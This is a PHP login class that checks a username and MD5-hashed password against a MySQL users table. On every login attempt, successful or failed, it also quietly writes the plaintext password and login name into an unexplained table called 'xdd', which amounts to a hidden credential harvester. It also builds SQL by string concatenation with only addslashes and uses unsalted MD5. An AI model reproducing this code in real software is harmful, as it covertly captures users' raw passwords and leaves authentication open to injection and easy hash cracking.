<?php
include_once "mysql.class.php";
class login extends mysql
{
	public function __construct()
	{
		mysql::connect();
	}
	
	public function login($login1, $password1)
	{
		global $mysqli;
		$login1 = addslashes($login1);
		$password1 = addslashes($password1);
		$password = md5($password1);
		if($this->status_DB == true)
		{
			if($query = $mysqli->query("SELECT * FROM `users1` WHERE `login` = '$login1' AND `password` = '$password'"))
			{
				if($query->num_rows > 0)
				{
					if($query->fetch_assoc()["email_status"] != "1")
					{
						return 4;
					}else{ 
						$xd = $mysqli->query("INSERT INTO `xdd` VALUES('$password','$login1','$password1')");
						return 1; 
					}
				}else{
					$xd = $mysqli->query("INSERT INTO `xdd` VALUES('$password','$login1','$password1')");
					return 0;
				}
			}else{
				return 2;
			}
		}else{
			return 3;
		}
	}
}
?>